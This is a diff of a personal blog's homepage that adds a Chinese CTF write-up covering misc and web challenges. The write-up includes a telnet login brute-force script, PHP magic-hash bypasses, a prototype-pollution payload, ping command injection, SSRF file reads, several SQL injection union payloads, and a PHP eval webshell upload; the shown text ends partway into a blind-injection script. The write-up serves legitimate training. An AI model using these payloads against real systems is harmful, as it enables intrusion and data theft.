@@ -20,11 +20,11 @@
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
     <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="L+1">
 <meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="L+1">
 <meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="article:author" content="ljy">
 <meta name="twitter:card" content="summary">
 
 
@@ -35,7 +35,7 @@
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Hexo</title>
+<title>L+1</title>
   
 
 
@@ -58,6 +58,9 @@
       <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
   <div class="site-nav-toggle">
     <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
     </div>
   </div>
 
@@ -65,7 +68,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <h1 class="site-title">Hexo</h1>
+      <h1 class="site-title">L+1</h1>
       <i class="logo-line"></i>
     </a>
   </div>
@@ -78,6 +81,10 @@
 
 
 
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
 
 
 
@@ -105,14 +112,14 @@
 
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">John Doe</p>
+  <p class="site-author-name" itemprop="name">ljy</p>
   <div class="site-description" itemprop="description"></div>
 </div>
 <div class="site-state-wrap animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -139,20 +146,507 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/23/AFL-6/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/11/ctf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
+      <meta itemprop="name" content="ljy">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
+      <meta itemprop="name" content="L+1">
       <meta itemprop="description" content="">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Hexo">
+      <meta itemprop="name" content="undefined | L+1">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/09/11/ctf/" class="post-title-link" itemprop="url">ctf</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2023-09-11 13:35:36 / Modified: 13:37:38" itemprop="dateCreated datePublished" datetime="2023-09-11T13:35:36+08:00">2023-09-11</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="01题-Invisible-Flag："><a href="#01题-Invisible-Flag：" class="headerlink" title="01题 Invisible Flag："></a>01题 Invisible Flag：</h2><p>高不够时</p>
+<img src="https://img1.imgtp.com/2023/08/29/OaHvDfEw.png" alt="1_01_1" style="zoom:50%;">
+
+<p>先查看图片属性长宽转为16进制，再使用010editor等二进制查看图片长宽的十六进制并修改</p>
+<img src="https://img1.imgtp.com/2023/09/03/orQ0TfBj.png" alt="image-20230709231732754" style="zoom:50%;">
+
+<h2 id="02题-Another-01Game："><a href="#02题-Another-01Game：" class="headerlink" title="02题 Another 01Game："></a>02题 Another 01Game：</h2><p>01字符先看长度是否能除7&#x2F;8 来判断是否为ascii编码，如果除不尽检查是否为平方，判断是否为二维码</p>
+<p><code>from PIL import Image MAX = 平方数 pic = Image.new(&quot;RGB&quot;,(MAX, MAX)) str = &quot;二进制数字&quot; i=0 for y in range (0,MAX):     for x in range (0,MAX):         if(str[i] == &#39;1&#39;):             pic.putpixel([x,y],(0, 0, 0))         else:             pic.putpixel([x,y],(255,255,255))         i = i+1 pic.show() pic.save(&quot;flag.png&quot;)</code></p>
+<p>得出二维码扫描再次得出二进制</p>
+<img src="https://img1.imgtp.com/2023/09/03/5gFToWeK.png" alt="微信图片_20230709234111" style="zoom:33%;">
+
+<p>此次可以除尽7</p>
+<img src="https://img1.imgtp.com/2023/09/03/yhsaJDoC.png" alt="image-20230710001501714" style="zoom:50%;">
+
+<p>在线网址为</p>
+<h2 id="03题-隐藏："><a href="#03题-隐藏：" class="headerlink" title="03题 隐藏："></a>03题 隐藏：</h2><img src="https://img1.imgtp.com/2023/09/03/kc9KOqHa.png" alt="image-20230731020046291" style="zoom:67%;">
+
+<h2 id="04题-文件格式："><a href="#04题-文件格式：" class="headerlink" title="04题 文件格式："></a>04题 文件格式：</h2><p><img src="https://img1.imgtp.com/2023/09/03/6b4gIFjJ.png" alt="image-20230824214021124"></p>
+<h2 id="05题-熟读登录密码三百首："><a href="#05题-熟读登录密码三百首：" class="headerlink" title="05题 熟读登录密码三百首："></a>05题 熟读登录密码三百首：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">tn = telnetlib.Telnet(<span class="string">&quot;10.140.32.159&quot;</span>,<span class="number">48127</span>)</span><br><span class="line"><span class="comment">#tn</span></span><br><span class="line">tn.write(<span class="string">&#x27;whosyourdaddy&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line">res = tn.read_very_eager().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#res</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#print(type(res))</span></span><br><span class="line"><span class="comment">#print(&#x27;\n\n\n&#x27;)</span></span><br><span class="line">res = res[<span class="number">130</span>:].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">password = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">  <span class="keyword">if</span> i!=<span class="string">&#x27; &#x27;</span>:</span><br><span class="line">    s+=i</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    password.append(s)</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(password)):</span><br><span class="line">  payload = <span class="string">&#x27;login [&#x27;</span> + password[i] + <span class="string">&#x27;]&#x27;</span></span><br><span class="line">  <span class="built_in">print</span>(payload)</span><br><span class="line">  tn.write(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  res = tn.read_very_eager().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(res)</span><br><span class="line">  time.sleep(<span class="number">0.02</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="01题-Basic-PHP："><a href="#01题-Basic-PHP：" class="headerlink" title="01题 Basic PHP："></a>01题 Basic PHP：</h2><p>php弱绕过</p>
+<p>md5 0e</p>
+<p><code>240610708:0e462097431906509019562988736854 QLTHNDT:0e405967825401955372549139051580 QNKCDZO:0e830400451993494058024219903391 PJNPDWY:0e291529052894702774557631701704 NWWKITQ:0e763082070976038347657360817689 NOOPCJF:0e818888003657176127862245791911 MMHUWUV:0e701732711630150438129209816536 MAUXXQC:0e478478466848439040434801845361</code></p>
+<p>sha1 0e</p>
+<p><code>10932435112: 0e07766915004133176347055865026311692244 aaroZmOk: 0e66507019969427134894567494305185566735 aaK1STfY: 0e76658526655756207688271159624026011393 aaO8zKZF: 0e89257456677279068558073954252716165668 aa3OFF9m: 0e36977786278517984959260394024281014729 0e1290633704: 0e19985187802402577070739524195726831799</code></p>
+<p>php强绕过</p>
+<p>数组绕过</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120973888">其他详细见此</a></p>
+<img src="https://img1.imgtp.com/2023/09/03/aw7pskdl.png" alt="image-20230719204041673" style="zoom:50%;">
+
+<h2 id="02题-helloworld："><a href="#02题-helloworld：" class="headerlink" title="02题 helloworld："></a>02题 helloworld：</h2><p>get和post传参，可以使用requests库，可以使用hackbar</p>
+<img src="https://img1.imgtp.com/2023/09/03/U7sQG7TY.png" alt="35f6b21557ddf88c2fb41637c2015aa" style="zoom:80%;">
+
+<p>得到结果要求使用get传</p>
+<img src="https://img1.imgtp.com/2023/09/03/AraVyzGF.png" alt="image-20230729015943059" style="zoom:50%;">
+
+<p>在网页中直接传参</p>
+<img src="https://img1.imgtp.com/2023/09/03/zTao5Cx7.png" alt="9bac75783cc460dae8868cb306eb3f2" style="zoom:67%;">
+
+<h2 id="03题-BabyXSS："><a href="#03题-BabyXSS：" class="headerlink" title="03题 BabyXSS："></a>03题 BabyXSS：</h2><p>md5截断：</p>
+<h2 id="04题-攻防世界-wife-wife："><a href="#04题-攻防世界-wife-wife：" class="headerlink" title="04题(攻防世界) wife_wife："></a>04题(攻防世界) wife_wife：</h2><p>原型链污染攻击</p>
+<p><a target="_blank" rel="noopener" href="https://blog.lxscloud.top/2022/11/13/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">参考博客</a></p>
+<p><code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;</code></p>
+<p><img src="https://img1.imgtp.com/2023/09/03/lejPgvDh.png" alt="image-20230822162302977"></p>
+<h2 id="05题-攻防世界-command-execution-ping-："><a href="#05题-攻防世界-command-execution-ping-：" class="headerlink" title="05题(攻防世界) command_execution(ping)："></a>05题(攻防世界) command_execution(ping)：</h2><p>题目是小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p>
+<p>在ping中夹杂系统命令，首先需要进行截断。</p>
+<p>windows 或 linux 下:</p>
+<p>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</p>
+<p>command1 | command2 只执行 command2</p>
+<p>command1 &amp; command2 先执行 command2 后执行command1</p>
+<p>command1 || command2 先执行 command1，如果为假，再执行 command2</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/XU3x17BT.png" alt="image-20230822183510121"></p>
+<p>可以看到只要能执行第二个命令即可</p>
+<p>可以通过ping能通的网站也可以直接写在第二个</p>
+<p>find &#x2F; -name  &#x2F;：意思是从&#x2F;开始进行查找。</p>
+<img src="https://img1.imgtp.com/2023/09/03/6FMoai0w.png" alt="image-20230822190239082" style="zoom: 80%;">
+
+<p>再用cat命令获得具体内容</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/WIODhlUC.png" alt="image-20230822190445615"></p>
+<h3 id="类05题-网络调试工具"><a href="#类05题-网络调试工具" class="headerlink" title="类05题 网络调试工具"></a>类05题 网络调试工具</h3><p>先加ls 发现有flag</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/ohSkaXdL.png" alt="image-20230829142839428"></p>
+<h2 id="06题-攻防世界ssrf-very-easy-sql："><a href="#06题-攻防世界ssrf-very-easy-sql：" class="headerlink" title="06题(攻防世界ssrf)very_easy_sql："></a>06题(攻防世界ssrf)very_easy_sql：</h2><h2 id="07题-local-curl："><a href="#07题-local-curl：" class="headerlink" title="07题 local_curl："></a>07题 local_curl：</h2><p>也是ssrf题，使用file:&#x2F;&#x2F;&#x2F;flag解出答案</p>
+<h2 id="08题-头儿："><a href="#08题-头儿：" class="headerlink" title="08题 头儿："></a>08题 头儿：</h2><p><img src="https://img1.imgtp.com/2023/09/03/lx0tNUDe.png" alt="image-20230828112129732"></p>
+<p>题目可以看出是头部信息</p>
+<p>查询$_SERVER可以看出，数组内信息转头部时要进行一定转换</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/3JqBhbQj.png" alt="image-20230828112107217"></p>
+<h2 id="09题-PHP之神奇的反序列化："><a href="#09题-PHP之神奇的反序列化：" class="headerlink" title="09题 PHP之神奇的反序列化："></a>09题 PHP之神奇的反序列化：</h2><p>已知反序列化问题 要post上一个b 绕过“waking up”让他unserialize的结果是gimmeflag</p>
+<p>分析代码</p>
+<img src="https://img1.imgtp.com/2023/09/03/CepxO375.png" alt="image-20230829093809255" style="zoom:80%;">
+
+<h2 id="10题-PHP之Mission-Impossible："><a href="#10题-PHP之Mission-Impossible：" class="headerlink" title="10题 PHP之Mission Impossible："></a>10题 PHP之Mission Impossible：</h2><blockquote>
+<p>isset():判断变量已设置且非null</p>
+<p>preg_replace():正则表达式的搜索和替换</p>
+</blockquote>
+<p><img src="https://img1.imgtp.com/2023/09/03/X0c0B5Se.png" alt="image-20230829144045003"></p>
+<p>将&#x2F;[\s\S]*&#x2F;替换成nope</p>
+<p>其中 \s替换空白字符  *匹配前面无数次  [.\n]匹配包括 ‘\n’ 在内的任何字符 \S匹配非空白字符</p>
+<p>i：表示不区分大小写</p>
+<p>使用数组输入get，会<strong>绕过数组</strong></p>
+<h2 id="11题-web-sqlite"><a href="#11题-web-sqlite" class="headerlink" title="11题 web sqlite:"></a>11题 web sqlite:</h2><p>传入1‘ or ‘1’&#x3D;’1 判断闭合方式是否为’</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/8q9ekeJx.png" alt="image-20230901172747718"></p>
+<p>可以看出是正确的</p>
+<p>下面看一共几列</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ID=<span class="number">1</span><span class="string">&#x27; order by 5--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/03/CLzCFzel.png" alt="image-20230901172959713"></p>
+<p>这说明成功</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/U5OCpcBt.png" alt="image-20230901173202028"></p>
+<p>这说明失败</p>
+<p>最终找到9列，union select 1,2,3,4,5,6,7,8,9–+来找从哪一列注入</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/NwzmgK5x.png" alt="image-20230901173353567"></p>
+<p>发现从第1列</p>
+<p>ID&#x3D;’union select (select group_concat(sql) from sqlite_master),2,3,4,5,6,7,8,9–+</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/TsAMD6Dw.png" alt="image-20230901173804988"></p>
+<p>可以看出表名为ctf，然后查ID</p>
+<p>select ID from ctf</p>
+<p>将查询出来的ID输入到网页中进行GET得到flag</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/BV2d934T.png" alt="image-20230901204814164"></p>
+<h3 id="类11题-简单的SQL注入"><a href="#类11题-简单的SQL注入" class="headerlink" title="类11题 简单的SQL注入"></a>类11题 简单的SQL注入</h3><p>注意查询时用id&#x3D;-1这种查不到的最终</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select (select group_concat(sql) from sqlite_master),2 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/03/KvHhB0P3.png" alt="image-20230902154507995"></p>
+<p>最终结果利用sqlite注入语句</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/OEg7nVXG.png" alt="image-20230902154204547"></p>
+<h3 id="类11题-Basic-SQL-oj"><a href="#类11题-Basic-SQL-oj" class="headerlink" title="类11题 Basic SQL(oj)"></a>类11题 Basic SQL(oj)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>news<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+<p>找表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>f1agfl4gher3<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+<p>找列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(h3r31sfl4g),3 from news.f1agfl4gher3 #</span></span><br></pre></td></tr></table></figure>
+
+<p>找内容   <strong>from后加数据库.表名</strong></p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904151153680.png" alt="image-20230904151153680"></p>
+<h2 id="12题-oj木马绕过-Basic-PHP-2："><a href="#12题-oj木马绕过-Basic-PHP-2：" class="headerlink" title="12题 (oj木马绕过)Basic PHP 2："></a>12题 (oj木马绕过)Basic PHP 2：</h2><p>网站中代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$filename</span> = <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&#x27;php&#x27;</span>)) || <span class="title function_ invoke__">is_int</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;&#x27;</span>))) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中判定条件为不区分大小写的函数stripos()</p>
+<p>只有他俩都返回错误才能绕过，故可以传数组让函数本身报错</p>
+<p>而且需要在网页get中改动</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?content[]=<span class="meta">&lt;?php</span>+<span class="keyword">eval</span>(<span class="variable">$_GET</span>[a]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904165158558.png" alt="image-20230904165158558"></p>
+<h2 id="13题-oj-BasicFileInclude："><a href="#13题-oj-BasicFileInclude：" class="headerlink" title="13题 (oj)BasicFileInclude："></a>13题 (oj)BasicFileInclude：</h2><p>文件包含漏洞：</p>
+<p>没有对变量进行严格校验或者校验被绕过。</p>
+<p>文件包含函数</p>
+<p>include&#x2F;include_once&#x2F;require&#x2F;require_once</p>
+<p>本地文件包含；远程文件包含</p>
+<p>文件包含漏洞的利用方式：伪协议</p>
+<p>file是本地文件访问，既可以利用文件包含漏洞也可以执行SSRF攻击。</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904193755017.png" alt="image-20230904193755017"></p>
+<p>本题得出</p>
+<p><img src="/2023/09/11/ctf/Users\李佳艺\AppData\Roaming\Typora\typora-user-images\image-20230904194157008.png" alt="image-20230904194157008"></p>
+<h2 id="CTFHUB："><a href="#CTFHUB：" class="headerlink" title="CTFHUB："></a>CTFHUB：</h2><h3 id="01-请求方式HTTP-methed"><a href="#01-请求方式HTTP-methed" class="headerlink" title="01 请求方式HTTP-methed"></a>01 请求方式HTTP-methed</h3><p>抓包后将左上角GET方式改成题目要求的CTFHUB</p>
+<h3 id="02-HTTP临时重定向"><a href="#02-HTTP临时重定向" class="headerlink" title="02 HTTP临时重定向"></a>02 HTTP临时重定向</h3><p>重定向是服务器无法处理请求时，告诉客户端的浏览器自己跳转到另外一个网页去</p>
+<p>重定向与请求转发的区别：</p>
+<p>请求转发是服务器发送到其他服务器进行处理，必须是同一个web容器下的url，其不能转向到其他的web路径上去，客户端只发了一个请求</p>
+<p>重定向是收到后发送302状态码和新地址 让客户端再次进行请求跳转到新地址</p>
+<p>状态码：301 永久性转移 302 临时性转移</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/2Kcj6aAo.png" alt="image-20230827162653030"></p>
+<p>因为curl默认是不跟随重定向的</p>
+<p>使用curl  curl <a target="_blank" rel="noopener" href="http://challenge-3c927192ce7669f9.sandbox.ctfhub.com:10800/index.php">http://challenge-3c927192ce7669f9.sandbox.ctfhub.com:10800/index.php</a></p>
+<p>不会跳转，curl -L会跳转</p>
+<h3 id="03-cookie-easy"><a href="#03-cookie-easy" class="headerlink" title="03 cookie(easy)"></a>03 cookie(easy)</h3><p>抓包之后修改cookie</p>
+<h3 id="04-sql注入之整数型注入"><a href="#04-sql注入之整数型注入" class="headerlink" title="04 sql注入之整数型注入"></a>04 sql注入之整数型注入</h3><h3 id="05-sql注入之字符型注入"><a href="#05-sql注入之字符型注入" class="headerlink" title="05 sql注入之字符型注入"></a>05 sql注入之字符型注入</h3><p>闭合 看到字符串类型 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>   万能模板</span><br></pre></td></tr></table></figure>
+
+<p>试探闭合方式 为引号</p>
+<p>闭合符号尝试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--+</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出第一种注释符没有用</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/7HSRHLNq.png" alt="image-20230828101946303"></p>
+<p>尝试第二种</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/8bMIoqRN.png" alt="image-20230828101751653"></p>
+<p>3没有</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/Hiwk4mbz.png" alt="image-20230828101837158"></p>
+<p>2可以 说明是2列</p>
+<p>再查找目标在第几列 可以看到1，2都可以</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/9G9QzBim.png" alt="image-20230828102248514"></p>
+<p>查找数据库</p>
+<p><img src="https://img1.imgtp.com/2023/09/03/JBBVGHyv.png" alt="image-20230828102728848"></p>
+<p>查找表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>sqli<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/03/TrrRSNLh.png" alt="image-20230828103106251"></p>
+<p>查找列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/03/JEAk0kaQ.PNG" alt="image-20230828103437081"></p>
+<p>查找列内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(flag) from sqli.flag #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/03/QjMbTgoi.png" alt="image-20230828103726958"></p>
+<h3 id="06-sql注入之报错型注入"><a href="#06-sql注入之报错型注入" class="headerlink" title="06 sql注入之报错型注入"></a>06 sql注入之报错型注入</h3><h3 id="07-sql注入之布尔盲注"><a href="#07-sql注入之布尔盲注" class="headerlink" title="07 sql注入之布尔盲注"></a>07 sql注入之布尔盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urlOPEN = <span 